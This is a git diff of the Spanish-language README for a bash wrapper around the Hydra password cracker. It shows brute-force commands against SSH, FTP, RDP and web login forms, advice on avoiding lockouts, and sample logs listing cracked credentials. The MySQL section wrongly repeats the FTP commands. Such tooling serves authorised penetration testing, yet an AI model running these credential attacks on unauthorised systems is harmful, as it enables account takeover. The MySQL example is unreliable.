@@ -109,7 +109,7 @@ HYDRA_EXTRA="..."       Pasa args extra a Hydra (ej: opciones del módulo HTTP)
 ```
 
 ## 🧪 Ejemplos por servicio
-SSH
+# SSH
 ```
 # Listas por defecto (lib/hosts.txt, lib/user.txt, lib/pass.txt)
 ./force-brute.sh -s ssh
@@ -120,7 +120,7 @@ SSH
 # Puerto no estándar
 ./force-brute.sh -s ssh --ip 10.0.0.10 --port 2222 --user-list lib/user.txt --pass-list lib/pass.txt
 ```
-FTP
+# FTP
 ```
 # FTP estándar (21)
 ./force-brute.sh -s ftp --ip-list lib/hosts.txt --user-list lib/user.txt --pass-list lib/pass.txt
@@ -128,8 +128,7 @@ FTP
 # Puerto personalizado (2121)
 ./force-brute.sh -s ftp --ip 10.0.0.20 --port 2121 --user-list lib/ftp_users.txt --pass-list lib/ftp_pass.txt
 ```
-
-MySQL
+# MySQL
 ```
 # FTP estándar (21)
 ./force-brute.sh -s ftp --ip-list lib/hosts.txt --user-list lib/user.txt --pass-list lib/pass.txt
@@ -137,28 +136,24 @@ MySQL
 # Puerto personalizado (2121)
 ./force-brute.sh -s ftp --ip 10.0.0.20 --port 2121 --user-list lib/ftp_users.txt --pass-list lib/ftp_pass.txt
 ```
-
-RDP (Windows)
+# RDP (Windows)
 ```
 # Sugerencia: baja hilos para evitar lockouts
 ./force-brute.sh -s rdp --ip-list lib/win_hosts.txt --user-list lib/win_users.txt --pass-list lib/win_pass.txt --threads 2
 
 ```
-
-HTTP (http-post-form) – Forma 1: triple directo
+# HTTP (http-post-form) – Forma 1: triple directo
 ```
 ./force-brute.sh -s http-post-form --ip 10.0.0.40 \
   --http-form "/login.php:username=^USER^&password=^PASS^:F=Credenciales inválidas"
 ```
-
-HTTPS (https-post-form) – éxito + header
+# HTTPS (https-post-form) – éxito + header
 ```
 ./force-brute.sh -s https-post-form --ip 10.0.0.41 --port 8443 \
   --http-form "/auth:usr=^USER^&pwd=^PASS^:S=Bienvenido:H=User-Agent\:\ Mozilla/5.0" \
   --user-list lib/users.txt --pass-list lib/pass.txt
-
 ```
-HTTP – Forma 2 (amigable): el script arma el triple
+# HTTP – Forma 2 (amigable): el script arma el triple
 ```
 ./force-brute.sh -s http-post-form --ip 10.0.0.42 \
   --http-path "/login" \
@@ -179,16 +174,17 @@ Log: salidas.log (append). Cada ejecución comienza con una cabecera:
 RUN: 2025-09-03T13:12:04-05:00 | user: anreynoso | service: ssh | hosts: 3
 ====================================================================
 [192.168.0.1] [22][ssh] host: 192.168.0.1  login: root   password: abcd1234
+
 ```
-Reporte: report_YYYYmmdd-HHMMSS.csv con formato:
+# Reporte: report_YYYYmmdd-HHMMSS.csv con formato:
 ```
 IP,User,Password
 10.200.6.28,root,abcd1234
 ```
 Las tuplas (IP,User,Password) no se repiten.
 
-##⚙️ Cómo funciona (en breve)
-
+## ⚙️ Cómo funciona (en breve)
+```
 - Paralelo: hasta --parallel N hosts simultáneos (default 5).
 
 - Hilos por host: --threads N (Hydra -t, default 4).
@@ -203,30 +199,27 @@ Las tuplas (IP,User,Password) no se repiten.
 
 - Hydra restore: se pasa -I por defecto (ignora sesiones previas). Quita con --no-ignore-restore.
 ```
-##🧯 Troubleshooting
+## 🧯 Troubleshooting
 “syntax error near unexpected token `{echo'”
 Suele venir de copiar/pegar con caracteres raros o CRLF. Ejecuta:
 ```
 sed -i 's/\r$//' force-brute.sh
 bash -n force-brute.sh && echo "OK de sintaxis"
-
 ```
-No escribe al CSV
+# No escribe al CSV
 Asegúrate de ver líneas tipo login: X password: Y en salidas.log. El parser extrae de esos mensajes de Hydra.
 Si tu idioma/cadena de éxito/fallo es distinto, ajusta --http-success/--http-fail.
 
-HTTP con CSRF
+# HTTP con CSRF
 Formularios con token requieren pasos extra (capturar y reenviar token). Este wrapper no automatiza CSRF.
 
-RDP / lockouts
+# RDP / lockouts
 Reduce --threads y --parallel para no disparar bloqueos.
 
 ## 🤝 Contribuir
 
 Issues y PRs bienvenidos.
-
 Estilo: bash estricto (set -Eeuo pipefail), sin dependencias externas salvo Hydra y utilidades básicas.
 
 ## 🪪 Licencia
-
 MIT © @kp01aj
